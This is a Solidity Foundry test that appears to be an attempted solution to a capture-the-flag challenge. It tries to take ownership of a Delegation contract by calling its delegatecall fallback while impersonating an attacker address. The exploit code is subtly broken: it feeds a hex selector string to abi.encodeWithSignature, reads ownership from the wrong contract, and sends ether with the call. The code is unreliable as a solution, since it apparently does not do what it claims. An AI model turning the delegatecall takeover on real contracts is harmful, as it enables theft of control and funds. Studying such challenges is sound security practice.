// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import {Delegate, Delegation} from "../Delegate.sol";

contract ContractTest is Test {
    Delegate delegate;
    Delegation delegation;

    function setUp() public {
        delegate = new Delegate(msg.sender);
        delegation = new Delegation(address(delegate));
    }

    function test_challenge_6() public {
        console.log("Challaenge #6");
        console.log("owner before", delegate.owner());
        deal(address(1337), 1 ether);
        vm.startPrank(address(1337));
        address(delegation).call{value: 0.1 ether}(
            abi.encodeWithSignature("0xdd365b8b")
        );
        console.log("owner after", delegate.owner());
        vm.stopPrank();
    }
}
